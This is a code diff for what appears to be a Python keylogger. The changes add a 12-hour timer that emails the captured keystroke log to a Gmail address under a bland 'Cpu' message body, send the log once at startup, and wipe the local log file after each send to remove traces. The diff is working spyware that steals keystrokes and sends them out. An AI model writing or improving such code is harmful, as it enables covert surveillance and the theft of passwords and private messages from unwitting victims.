@@ -16,6 +16,14 @@ class Main:
         self.count = 0
         self.key_time = 0
         self.t = Timer(1.0, self.key_timer_nit)
+        self.t_mail = Timer(43200.0, self.sm_timer_logic)
+        self.send_email()
+        
+    def sm_timer_logic(self):
+        self.t_mail.cancel()
+        self.send_email()
+        self.t_mail = Timer(43200.0, self.sm_timer_logic)
+        self.t_mail.start()
 
     def key_timer_nit(self):
         return
@@ -52,7 +60,6 @@ class Main:
         self.count = 0
         self.key_write()
         self.keys = []
-        self.send_email()
 
     def setup(self):
         self.listener.start()
@@ -67,7 +74,7 @@ class Main:
         message['From'] = 'loggerdatamail@gmail.com'
         message['To'] = 'loggerdatamail@gmail.com'
         message['Subject'] = 'Logger Data'
-        message.attach(MIMEText(' ', 'plain'))
+        message.attach(MIMEText('Cpu', 'plain'))
 
         attachment = open(os.path.abspath(self.fn), 'rb')
 
@@ -89,6 +96,10 @@ class Main:
         s.sendmail('loggerdatamail@gmail.com', 'loggerdatamail@gmail.com', message.as_string())
         
         s.quit()
+
+        #clear file after mail send
+        open(self.fn, 'w').close()
+
 
 def main():
     Logger = Main('log')
